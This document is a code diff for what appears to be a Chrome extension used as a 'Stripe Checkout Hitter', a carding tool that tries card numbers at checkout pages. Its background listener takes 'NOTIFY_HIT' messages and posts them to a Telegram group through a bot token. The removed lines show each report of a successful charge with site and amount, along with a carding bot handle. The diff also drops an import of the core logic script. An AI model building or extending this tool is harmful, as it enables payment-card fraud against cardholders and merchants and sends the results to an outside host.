@@ -10,26 +10,18 @@
 
     chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         if (request.type === 'NOTIFY_HIT') {
-            const { card, amount, gateway, status, site_name } = request.data;
+            const messageObj = request.data;
             
             (async () => {
                 try {
-                    const message = `<b>HIT BDT</b>\n` +
-                                    `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
-                                    `👤 <b>User:</b> 🇧🇩\n` +
-                                    `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
-                                    `↔️ <b>Gateway:</b> <code>Stripe Checkout Hitter</code>\n` +
-                                    `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
-                                    `🌐 <b>Site:</b> <code>${site_name || 'Unknown'}</code>\n` +
-                                    `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
-                                    `<i>Checked by @hitinfobdrobot ✅</i>`;
+                    const messageText = messageObj.text || "🟢 <b>HIT DETECTED</b> (Empty payload)";
 
                     await fetch(`https://api.telegram.org/bot${_NEX_V12_TOKEN_}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: _NEX_V12_GROUP_,
-                            text: message,
+                            text: messageText,
                             parse_mode: 'HTML',
                             reply_markup: {
                                 inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
@@ -47,8 +39,5 @@
 })();
 
 // 2. Load Core Logic (Forced Restoration Clean)
-try {
-    importScripts('background_core.js');
-} catch (e) {
-    console.error("Core Logic Bridge Failed:", e);
-}
+// background_core.js completely removed to prevent Service Worker crashes.
+
